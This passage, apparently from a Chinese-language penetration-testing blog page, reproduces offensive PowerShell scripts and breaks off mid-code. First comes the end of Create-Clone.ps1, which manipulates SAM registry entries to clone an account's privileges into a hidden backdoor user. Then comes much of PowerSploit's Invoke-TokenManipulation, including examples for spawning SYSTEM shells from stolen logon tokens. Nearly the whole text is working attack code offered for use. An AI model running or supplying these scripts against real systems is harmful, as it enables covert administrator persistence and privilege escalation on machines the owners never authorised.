variable">$env</span>:temp\<span class="token variable">$user</span>.ini"</span>        <span class="token function">Remove-Item</span> <span class="token variable">$env</span>:temp\<span class="token variable">$user</span><span class="token punctuation">.</span>ini        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">Test-Path</span> <span class="token operator">-</span>Path <span class="token string">"HKLM:\SAM\SAM\Domains\Account\Users\Names\<span class="token variable">$user</span>"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            cmd <span class="token operator">/</span>c <span class="token string">"regedit /e <span class="token variable">$env</span>:temp\<span class="token variable">$user</span>.reg "</span>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\<span class="token variable">$user</span><span class="token string">""</span>            <span class="token variable">$file</span> = <span class="token function">Get-Content</span> <span class="token string">"<span class="token variable">$env</span>:temp\<span class="token variable">$user</span>.reg"</span>  <span class="token punctuation">|</span> <span class="token function">Out-String</span>            <span class="token variable">$pattern</span>=<span class="token string">"@=hex\((.*?)\)\:"</span>            <span class="token variable">$file</span> <span class="token operator">-match</span> <span class="token variable">$pattern</span> <span class="token punctuation">|</span><span class="token function">Out-Null</span>            <span class="token variable">$key</span> = <span class="token string">"00000"</span><span class="token operator">+</span><span class="token variable">$matches</span><span class="token punctuation">[</span>1<span class="token punctuation">]</span>            <span class="token function">Write-Host</span> <span class="token string">"[!]"</span><span class="token variable">$key</span>            <span class="token keyword">return</span> <span class="token variable">$key</span>        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">Write-Host</span> <span class="token string">"[-] SomeThing Wrong !"</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> Clone <span class="token punctuation">(</span><span class="token namespace">[string]</span><span class="token variable">$ukey</span><span class="token punctuation">,</span><span class="token namespace">[string]</span><span class="token variable">$cukey</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token string">"HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\<span class="token variable">$ukey</span> [1 17] "</span><span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token variable">$env</span>:temp\f<span class="token punctuation">.</span>ini        <span class="token string">"HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\<span class="token variable">$cukey</span> [1 17] "</span> <span class="token punctuation">|</span> <span class="token function">Out-File</span> <span class="token variable">$env</span>:temp\f<span class="token punctuation">.</span>ini        cmd <span class="token operator">/</span>c <span class="token string">" regini <span class="token variable">$env</span>:temp\f.ini"</span>        <span class="token function">Remove-Item</span> <span class="token variable">$env</span>:temp\f<span class="token punctuation">.</span>ini        <span class="token variable">$ureg</span> = <span class="token string">"HKLM:\SAM\SAM\Domains\Account\Users\<span class="token variable">$ukey</span>"</span> <span class="token punctuation">|</span><span class="token function">Out-String</span>        <span class="token variable">$cureg</span> = <span class="token string">"HKLM:\SAM\SAM\Domains\Account\Users\<span class="token variable">$cukey</span>"</span> <span class="token punctuation">|</span><span class="token function">Out-String</span>        <span class="token function">Write-Host</span> <span class="token string">"[*] Get clone user'F value"</span>        <span class="token variable">$cuFreg</span> = <span class="token function">Get-Item</span> <span class="token operator">-</span>Path <span class="token variable">$cureg</span><span class="token punctuation">.</span>Trim<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token variable">$cuFvalue</span> = <span class="token variable">$cuFreg</span><span class="token punctuation">.</span>GetValue<span class="token punctuation">(</span><span class="token string">'F'</span><span class="token punctuation">)</span>        <span class="token function">Write-Host</span> <span class="token string">"[*] Change user'F value"</span>        <span class="token function">Set-ItemProperty</span> <span class="token operator">-</span>path <span class="token variable">$ureg</span><span class="token punctuation">.</span>Trim<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token operator">-</span>Name <span class="token string">"F"</span> <span class="token operator">-</span>value <span class="token variable">$cuFvalue</span>        <span class="token variable">$outreg</span> = <span class="token string">"HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\<span class="token variable">$ukey</span>"</span>        cmd <span class="token operator">/</span>c <span class="token string">"regedit /e <span class="token variable">$env</span>:temp\out.reg <span class="token variable">$outreg</span>.Trim()"</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> Main <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token punctuation">(</span><span class="token namespace">[Security.Principal.WindowsPrincipal]</span> <span class="token namespace">[Security.Principal.WindowsIdentity]</span>::GetCurrent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>IsInRole<span class="token punctuation">(</span><span class="token namespace">[Security.Principal.WindowsBuiltInRole]</span> <span class="token string">"Administrator"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">Write-Output</span> <span class="token string">"Script must be run as administrator"</span>             <span class="token keyword">break</span>        <span class="token punctuation">}</span>        <span class="token function">Write-Output</span> <span class="token string">"[*] Start"</span>        <span class="token function">Write-Output</span> <span class="token string">"[*] Tring to change reg privilege !"</span>        upReg        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">Test-Path</span> <span class="token operator">-</span>path <span class="token string">"HKLM:\SAM\SAM\Domains\Account\Users\Names\<span class="token variable">$cu</span>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">Write-Host</span> <span class="token string">"[-] The User to Clone does not exist !"</span>            <span class="token function">Write-Output</span> <span class="token string">"[*] Change reg privilege back !"</span>            downReg            <span class="token function">Write-Output</span> <span class="token string">"[*] Exiting !"</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">Test-Path</span> <span class="token operator">-</span>path <span class="token string">"HKLM:\SAM\SAM\Domains\Account\Users\Names\<span class="token variable">$u</span>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token variable">$tmp</span> = <span class="token string">"1"</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token variable">$tmp</span> = <span class="token string">"0"</span>            <span class="token punctuation">}</span>            <span class="token function">Write-Output</span> <span class="token string">"[*] Create User..."</span>            Create<span class="token operator">-</span>user <span class="token variable">$u</span> <span class="token variable">$p</span>            <span class="token function">Write-Output</span> <span class="token string">"[*] Get User <span class="token variable">$u</span>'s  Key .."</span>            <span class="token variable">$ukey</span> = GetUser<span class="token operator">-</span>Key <span class="token variable">$u</span> <span class="token punctuation">|</span><span class="token function">Out-String</span>            <span class="token function">Write-Output</span> <span class="token string">"[*] Get User <span class="token variable">$cu</span>'s  Key .."</span>            <span class="token variable">$cukey</span> = GetUser<span class="token operator">-</span>Key <span class="token variable">$cu</span> <span class="token punctuation">|</span><span class="token function">Out-String</span>            <span class="token function">Write-Output</span> <span class="token string">"[*] Clone User.."</span>            Clone <span class="token variable">$ukey</span> <span class="token variable">$cukey</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$tmp</span> <span class="token operator">-eq</span> 1 <span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">Write-Output</span> <span class="token string">"[*] Delete User.."</span>                cmd <span class="token operator">/</span>c <span class="token string">"net User <span class="token variable">$u</span> /del "</span> <span class="token punctuation">|</span><span class="token function">Out-Null</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token function">Write-Output</span> <span class="token string">"[*] Don't need to delete.."</span><span class="token punctuation">}</span>            cmd <span class="token operator">/</span>c <span class="token string">"regedit /s <span class="token variable">$env</span>:temp\<span class="token variable">$u</span>.reg"</span>            cmd <span class="token operator">/</span>c <span class="token string">"regedit /s <span class="token variable">$env</span>:temp\out.reg"</span>            <span class="token function">Remove-Item</span> <span class="token variable">$env</span>:temp\<span class="token operator">*</span><span class="token punctuation">.</span>reg            <span class="token function">Write-Output</span> <span class="token string">"[*] Change reg privilege back !"</span>            downreg            <span class="token function">Write-Output</span> <span class="token string">"[*] Done"</span>        <span class="token punctuation">}</span>          <span class="token punctuation">}</span>    Main<span class="token punctuation">}</span></code></pre><ul><li><p>脚本来源：<a href="https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Create-Clone.ps1" target="_blank" rel="noopener">Evilcg</a></p></li><li><p>运行条件：需要管理员权限</p></li></ul><p>Invoke-TokenManipulation.ps1脚本内容如下所示：</p><pre class=" language-powershell"><code class="language-powershell"><span class="token keyword">function</span> Invoke<span class="token operator">-</span>TokenManipulation<span class="token punctuation">{</span><span class="token comment" spellcheck="true">&lt;#.SYNOPSISThis script requires Administrator privileges. It can enumerate the Logon Tokens available and use them to create new processes. This allows you to useanothers users credentials over the network by creating a process with their logon token. This will work even with Windows 8.1 LSASS protections.This functionality is very similar to the incognito tool (with some differences, and different use goals).This script can also make the PowerShell thread impersonate another users Logon Token. Unfortunately this doesn't work well, because PowerShellcreates new threads to do things, and those threads will use the Primary token of the PowerShell process (your original token) and not the tokenthat one thread is impersonating. Because of this, you cannot use thread impersonation to impersonate a user and then use PowerShell remoting to connectto another server as that user (it will authenticate using the primary token of the process, which is your original logon token).Because of this limitation, the recommended way to use this script is to use CreateProcess to create a new PowerShell process with another users Logon Token, and then use this process to pivot. This works because the entire process is created using the other users Logon Token, so it will use theircredentials for the authentication.IMPORTANT: If you are creating a process, by default this script will modify the ACL of the current users desktop to allow full control to "Everyone". This is done so that the UI of the process is shown. If you do not need the UI, use the -NoUI flag to prevent the ACL from being modified. This ACLis not permenant, as in, when the current logs off the ACL is cleared. It is still preferrable to not modify things unless they need to be modified though,so I created the NoUI flag. ALSO: When creating a process, the script will request SeSecurityPrivilege so it can enumerate and modify the ACL of the desktop.This could show up in logs depending on the level of monitoring.PERMISSIONS REQUIRED:SeSecurityPrivilege: Needed if launching a process with a UI that needs to be rendered. Using the -NoUI flag blocks this.SeAssignPrimaryTokenPrivilege : Needed if launching a process while the script is running in Session 0.Important differences from incognito:First of all, you should probably read the incognito white paper to understand what incognito does. If you use incognito, you'll notice it differentiatesbetween "Impersonation" and "Delegation" tokens. This is because incognito can be used in situations where you get remote code execution against a servicewhich has threads impersonating multiple users. Incognito can enumerate all tokens available to the service process, and impersonate them (which might allowyou to elevate privileges). This script must be run as administrator, and because you are already an administrator, the primary use of this script is for pivotingwithout dumping credentials. In this situation, Impersonation vs Delegation does not matter because an administrator can turn any token in to a primary token (delegation rights). What doesmatter is the logon type used to create the logon token. If a user connects using Network Logon (aka type 3 logon), the computer will not have any credentials for the user. Since the computer has no credentials associated with the token, it will not be possible to authenticate off-box with the token. All other logon typesshould have credentials associated with them (such as Interactive logon, Service logon, Remote interactive logon, etc). Therefore, this script looksfor tokens which were created with desirable logon tokens (and only displays them by default).In a nutshell, instead of worrying about "delegation vs impersonation" tokens, you should worry about NetworkLogon (bad) vs Non-NetworkLogon (good).PowerSploit Function: Invoke-TokenManipulationAuthor: Joe Bialek, Twitter: @JosephBialekLicense: BSD 3-ClauseRequired Dependencies: NoneOptional Dependencies: None.DESCRIPTIONLists available logon tokens. Creates processes with other users logon tokens, and impersonates logon tokens in the current thread..PARAMETER EnumerateSwitch. Specifics to enumerate logon tokens available. By default this will only list unqiue usable tokens (not network-logon tokens)..PARAMETER RevToSelfSwitch. Stops impersonating an alternate users Token..PARAMETER ShowAllSwitch. Enumerate all Logon Tokens (including non-unique tokens and NetworkLogon tokens)..PARAMETER ImpersonateUserSwitch. Will impersonate an alternate users logon token in the PowerShell thread. Can specify the token to use by Username, ProcessId, or ThreadId.    This mode is not recommended because PowerShell is heavily threaded and many actions won't be done in the current thread. Use CreateProcess instead..PARAMETER CreateProcessSpecify a process to create with an alternate users logon token. Can specify the token to use by Username, ProcessId, or ThreadId..PARAMETER WhoAmISwitch. Displays the credentials the PowerShell thread is running under..PARAMETER UsernameSpecify the Token to use by username. This will choose a non-NetworkLogon token belonging to the user..PARAMETER ProcessIdSpecify the Token to use by ProcessId. This will use the primary token of the process specified..PARAMETER ProcessSpecify the token to use by process object (will use the processId under the covers). This will impersonate the primary token of the process..PARAMETER ThreadIdSpecify the Token to use by ThreadId. This will use the token of the thread specified..PARAMETER ProcessArgsSpecify the arguments to start the specified process with when using the -CreateProcess mode..PARAMETER NoUIIf you are creating a process which doesn't need a UI to be rendered, use this flag. This will prevent the script from modifying the Desktop ACL's of the current user. If this flag isn't set and -CreateProcess is used, this script will modify the ACL's of the current users desktop to allow full controlto "Everyone"..PARAMETER PassThruIf you are creating a process, this will pass the System.Diagnostics.Process object to the pipeline..EXAMPLEInvoke-TokenManipulation -EnumerateLists all unique usable tokens on the computer..EXAMPLEInvoke-TokenManipulation -CreateProcess "cmd.exe" -Username "nt authority\system"Spawns cmd.exe as SYSTEM..EXAMPLEInvoke-TokenManipulation -ImpersonateUser -Username "nt authority\system"Makes the current PowerShell thread impersonate SYSTEM..EXAMPLEInvoke-TokenManipulation -CreateProcess "cmd.exe" -ProcessId 500Spawns cmd.exe using the primary token belonging to process ID 500..EXAMPLEInvoke-TokenManipulation -ShowAllLists all tokens available on the computer, including non-unique tokens and tokens created using NetworkLogon..EXAMPLEInvoke-TokenManipulation -CreateProcess "cmd.exe" -ThreadId 500Spawns cmd.exe using the token belonging to thread ID 500..EXAMPLEGet-Process wininit | Invoke-TokenManipulation -CreateProcess "cmd.exe"Spawns cmd.exe using the primary token of LSASS.exe. This pipes the output of Get-Process to the "-Process" parameter of the script..EXAMPLE(Get-Process wininit | Invoke-TokenManipulation -CreateProcess "cmd.exe" -PassThru).WaitForExit()Spawns cmd.exe using the primary token of LSASS.exe. Then holds the spawning PowerShell session until that process has exited..EXAMPLEGet-Process wininit | Invoke-TokenManipulation -ImpersonateUserMakes the current thread impersonate the lsass security token..NOTESThis script was inspired by incognito. Several of the functions used in this script were written by Matt Graeber(Twitter: @mattifestation, Blog: http://www.exploit-monday.com/).BIG THANKS to Matt Graeber for helping debug..LINKBlog: http://clymb3r.wordpress.com/Github repo: https://github.com/clymb3r/PowerShellBlog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/#></span>    <span class="token punctuation">[</span>CmdletBinding<span class="token punctuation">(</span>DefaultParameterSetName=<span class="token string">"Enumerate"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">Param</span><span class="token punctuation">(</span>        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName = <span class="token string">"Enumerate"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token namespace">[Switch]</span>        <span class="token variable">$Enumerate</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName = <span class="token string">"RevToSelf"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token namespace">[Switch]</span>        <span class="token variable">$RevToSelf</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName = <span class="token string">"ShowAll"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token namespace">[Switch]</span>        <span class="token variable">$ShowAll</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName = <span class="token string">"ImpersonateUser"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token namespace">[Switch]</span>        <span class="token variable">$ImpersonateUser</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName = <span class="token string">"CreateProcess"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token namespace">[String]</span>        <span class="token variable">$CreateProcess</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName = <span class="token string">"WhoAmI"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token namespace">[Switch]</span>        <span class="token variable">$WhoAmI</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName = <span class="token string">"ImpersonateUser"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName = <span class="token string">"CreateProcess"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token namespace">[String]</span>        <span class="token variable">$Username</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName = <span class="token string">"ImpersonateUser"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName = <span class="token string">"CreateProcess"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token namespace">[Int]</span>        <span class="token variable">$ProcessId</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName = <span class="token string">"ImpersonateUser"</span><span class="token punctuation">,</span> ValueFromPipeline=<span class="token boolean">$true</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName = <span class="token string">"CreateProcess"</span><span class="token punctuation">,</span> ValueFromPipeline=<span class="token boolean">$true</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token namespace">[System.Diagnostics.Process]</span>        <span class="token variable">$Process</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName = <span class="token string">"ImpersonateUser"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName = <span class="token string">"CreateProcess"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token variable">$ThreadId</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName = <span class="token string">"CreateProcess"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token namespace">[String]</span>        <span class="token variable">$ProcessArgs</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName = <span class="token string">"CreateProcess"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token namespace">[Switch]</span>        <span class="token variable">$NoUI</span><span class="token punctuation">,</span>        <span class="token punctuation">[</span>Parameter<span class="token punctuation">(</span>ParameterSetName = <span class="token string">"CreateProcess"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token namespace">[Switch]</span>        <span class="token variable">$PassThru</span>    <span class="token punctuation">)</span>    <span class="token function">Set-StrictMode</span> <span class="token operator">-</span>Version 2    <span class="token comment" spellcheck="true">#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/</span>    <span class="token keyword">Function</span> Get<span class="token operator">-</span>DelegateType    <span class="token punctuation">{</span>        <span class="token keyword">Param</span>        <span class="token punctuation">(</span>            <span class="token namespace">[OutputType([Type]</span><span class="token punctuation">)</span><span class="token punctuation">]</span>            <span class="token namespace">[Parameter( Position = 0)]</span>            <span class="token namespace">[Type[]</span><span class="token punctuation">]</span>            <span class="token variable">$Parameters</span> = <span class="token punctuation">(</span><span class="token function">New-Object</span> <span class="token function">Type</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>0<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token namespace">[Parameter( Position = 1 )]</span>            <span class="token namespace">[Type]</span>            <span class="token variable">$ReturnType</span> = <span class="token namespace">[Void]</span>        <span class="token punctuation">)</span>        <span class="token variable">$Domain</span> = <span class="token namespace">[AppDomain]</span>::CurrentDomain        <span class="token variable">$DynAssembly</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Reflection<span class="token punctuation">.</span>AssemblyName<span class="token punctuation">(</span><span class="token string">'ReflectedDelegate'</span><span class="token punctuation">)</span>        <span class="token variable">$AssemblyBuilder</span> = <span class="token variable">$Domain</span><span class="token punctuation">.</span>DefineDynamicAssembly<span class="token punctuation">(</span><span class="token variable">$DynAssembly</span><span class="token punctuation">,</span> <span class="token namespace">[System.Reflection.Emit.AssemblyBuilderAccess]</span>::Run<span class="token punctuation">)</span>        <span class="token variable">$ModuleBuilder</span> = <span class="token variable">$AssemblyBuilder</span><span class="token punctuation">.</span>DefineDynamicModule<span class="token punctuation">(</span><span class="token string">'InMemoryModule'</span><span class="token punctuation">,</span> <span class="token boolean">$false</span><span class="token punctuation">)</span>        <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineType<span class="token punctuation">(</span><span class="token string">'MyDelegateType'</span><span class="token punctuation">,</span> <span class="token string">'Class, Public, Sealed, AnsiClass, AutoClass'</span><span class="token punctuation">,</span> <span class="token namespace">[System.MulticastDelegate]</span><span class="token punctuation">)</span>        <span class="token variable">$ConstructorBuilder</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineConstructor<span class="token punctuation">(</span><span class="token string">'RTSpecialName, HideBySig, Public'</span><span class="token punctuation">,</span> <span class="token namespace">[System.Reflection.CallingConventions]</span>::Standard<span class="token punctuation">,</span> <span class="token variable">$Parameters</span><span class="token punctuation">)</span>        <span class="token variable">$ConstructorBuilder</span><span class="token punctuation">.</span>SetImplementationFlags<span class="token punctuation">(</span><span class="token string">'Runtime, Managed'</span><span class="token punctuation">)</span>        <span class="token variable">$MethodBuilder</span> = <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>DefineMethod<span class="token punctuation">(</span><span class="token string">'Invoke'</span><span class="token punctuation">,</span> <span class="token string">'Public, HideBySig, NewSlot, Virtual'</span><span class="token punctuation">,</span> <span class="token variable">$ReturnType</span><span class="token punctuation">,</span> <span class="token variable">$Parameters</span><span class="token punctuation">)</span>        <span class="token variable">$MethodBuilder</span><span class="token punctuation">.</span>SetImplementationFlags<span class="token punctuation">(</span><span class="token string">'Runtime, Managed'</span><span class="token punctuation">)</span>        <span class="token function">Write-Output</span> <span class="token variable">$TypeBuilder</span><span class="token punctuation">.</span>CreateType<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/</span>    <span class="token keyword">Function</span> Get<span class="token operator">-</span>ProcAddress    <span class="token punctuation">{</span>        <span class="token keyword">Param</span>        <span class="token punctuation">(</span>            <span class="token namespace">[OutputType([IntPtr]</span><span class="token punctuation">)</span><span class="token punctuation">]</span>            <span class="token namespace">[Parameter( Position = 0, Mandatory = $True )]</span>            <span class="token namespace">[String]</span>            <span class="token variable">$Module</span><span class="token punctuation">,</span>            <span class="token namespace">[Parameter( Position = 1, Mandatory = $True )]</span>            <span class="token namespace">[String]</span>            <span class="token variable">$Procedure</span>        <span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># Get a reference to System.dll in the GAC</span>        <span class="token variable">$SystemAssembly</span> = <span class="token namespace">[AppDomain]</span>::CurrentDomain<span class="token punctuation">.</span>GetAssemblies<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">|</span>            <span class="token function">Where-Object</span> <span class="token punctuation">{</span> <span class="token variable">$_</span><span class="token punctuation">.</span>GlobalAssemblyCache <span class="token operator">-And</span> <span class="token variable">$_</span><span class="token punctuation">.</span>Location<span class="token punctuation">.</span>Split<span class="token punctuation">(</span><span class="token string">'\\'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span>1<span class="token punctuation">]</span><span class="token punctuation">.</span>Equals<span class="token punctuation">(</span><span class="token string">'System.dll'</span><span class="token punctuation">)</span> <span class="token punctuation">}</span>        <span class="token variable">$UnsafeNativeMethods</span> = <span class="token variable">$SystemAssembly</span><span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">'Microsoft.Win32.UnsafeNativeMethods'</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># Get a reference to the GetModuleHandle and GetProcAddress methods</span>        <span class="token variable">$GetModuleHandle</span> = <span class="token variable">$UnsafeNativeMethods</span><span class="token punctuation">.</span>GetMethod<span class="token punctuation">(</span><span class="token string">'GetModuleHandle'</span><span class="token punctuation">)</span>        <span class="token variable">$GetProcAddress</span> = <span class="token variable">$UnsafeNativeMethods</span><span class="token punctuation">.</span>GetMethod<span class="token punctuation">(</span><span class="token string">'GetProcAddress'</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># Get a handle to the module specified</span>        <span class="token variable">$Kern32Handle</span> = <span class="token variable">$GetModuleHandle</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$null</span><span class="token punctuation">,</span> @<span class="token punctuation">(</span><span class="token variable">$Module</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token variable">$tmpPtr</span> = <span class="token function">New-Object</span> IntPtr        <span class="token variable">$HandleRef</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span>InteropServices<span class="token punctuation">.</span>HandleRef<span class="token punctuation">(</span><span class="token variable">$tmpPtr</span><span class="token punctuation">,</span> <span class="token variable">$Kern32Handle</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># Return the address of the function</span>        <span class="token function">Write-Output</span> <span class="token variable">$GetProcAddress</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$null</span><span class="token punctuation">,</span> @<span class="token punctuation">(</span><span class="token namespace">[System.Runtime.InteropServices.HandleRef]</span><span class="token variable">$HandleRef</span><span class="token punctuation">,</span> <span class="token variable">$Procedure</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">###############################</span>    <span class="token comment" spellcheck="true">#Win32Constants</span>    <span class="token comment" spellcheck="true">###############################</span>    <span class="token variable">$Constants</span> = @<span class="token punctuation">{</span>        ACCESS_SYSTEM_SECURITY = 0x01000000        READ_CONTROL = 0x00020000        SYNCHRONIZE = 0x00100000        STANDARD_RIGHTS_ALL = 0x001F0000        TOKEN_QUERY = 8        TOKEN_ADJUST_PRIVILEGES = 0x20        ERROR_NO_TOKEN = 0x3f0        SECURITY_DELEGATION = 3        DACL_SECURITY_INFORMATION = 0x4        ACCESS_ALLOWED_ACE_TYPE = 0x0        STANDARD_RIGHTS_REQUIRED = 0x000F0000        DESKTOP_GENERIC_ALL = 0x000F01FF        WRITE_DAC = 0x00040000        OBJECT_INHERIT_ACE = 0x1        GRANT_ACCESS = 0x1        TRUSTEE_IS_NAME = 0x1        TRUSTEE_IS_SID = 0x0        TRUSTEE_IS_USER = 0x1        TRUSTEE_IS_WELL_KNOWN_GROUP = 0x5        TRUSTEE_IS_GROUP = 0x2        PROCESS_QUERY_INFORMATION = 0x400        TOKEN_ASSIGN_PRIMARY = 0x1        TOKEN_DUPLICATE = 0x2        TOKEN_IMPERSONATE = 0x4        TOKEN_QUERY_SOURCE = 0x10        STANDARD_RIGHTS_READ = 0x20000        TokenStatistics = 10        TOKEN_ALL_ACCESS = 0xf01ff        MAXIMUM_ALLOWED = 0x02000000        THREAD_ALL_ACCESS = 0x1f03ff        ERROR_INVALID_PARAMETER = 0x57        LOGON_NETCREDENTIALS_ONLY = 0x2        SE_PRIVILEGE_ENABLED = 0x2        SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x1        SE_PRIVILEGE_REMOVED = 0x4    <span class="token punctuation">}</span>    <span class="token variable">$Win32Constants</span> = <span class="token function">New-Object</span> PSObject <span class="token operator">-</span>Property <span class="token variable">$Constants</span>    <span class="token comment" spellcheck="true">###############################</span>    <span class="token comment" spellcheck="true">###############################</span>    <span class="token comment" spellcheck="true">#Win32Structures</span>    <span class="token comment" spellcheck="true">###############################</span>    <span class="token comment" spellcheck="true">#Define all the structures/enums that will be used</span>    <span class="token comment" spellcheck="true">#    This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html</span>    <span class="token variable">$Domain</span> = <span class="token namespace">[AppDomain]</span>::CurrentDomain    <span class="token variable">$DynamicAssembly</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Reflection<span class="token punctuation">.</span>AssemblyName<span class="token punctuation">(</span><span class="token string">'DynamicAssembly'</span><span class="token punctuation">)</span>    <span class="token variable">$AssemblyBuilder</span> = <span class="token variable">$Domain</span><span class="token punctuation">.</span>DefineDynamicAssembly<span class="token punctuation">(</span><span class="token variable">$DynamicAssembly</span><span class="token punctuation">,</span> <span class="token namespace">[System.Reflection.Emit.AssemblyBuilderAccess]</span>::Run<span class="token punctuation">)</span>    <span class="token variable">$ModuleBuilder</span> = <span class="token variable">$AssemblyBuilder</span><span class="token punctuation">.</span>DefineDynamicModule<span class="token punctuation">(</span><span class="token string">'DynamicModule'</span><span class="token punctuation">,</span> <span class="token boolean">$false</span><span class="token punctuation">)</span>    <span class="token variable">$ConstructorInfo</span> = <span class="token namespace">[System.Runtime.InteropServices.MarshalAsAttribute]</span><span class="token punctuation">.</span>GetConstructors<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>0<span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#ENUMs</span>    <span class="token variable">$TypeBuilder</span> = <span class="token variable">$ModuleBuilder</span><span class="token punctuation">.</span>DefineEnum<span class="token punctuation">(</span><span class="token string">'TOKEN_INFORMATION_CLASS'</span><span class="token 